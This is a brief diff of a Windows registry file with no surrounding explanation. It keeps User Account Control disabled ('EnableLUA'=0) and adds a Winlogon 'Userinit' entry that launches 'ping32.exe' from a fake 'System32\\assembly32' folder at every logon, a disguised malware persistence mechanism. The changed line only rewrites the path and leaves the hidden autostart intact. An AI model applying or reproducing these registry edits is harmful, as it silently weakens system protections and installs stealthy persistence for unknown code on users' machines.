@@ -13,4 +13,4 @@ Windows Registry Editor Version 5.00
 "EnableLUA"=dword:00000000
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
-"Userinit"="C:\\Windows\\system32\\userinit.exe, %systemroot%\\System32\\assembly32\\ping32.exe"
+"Userinit"="C:\\Windows\\system32\\userinit.exe, C:\\Windows\\System32\\assembly32\\ping32.exe"
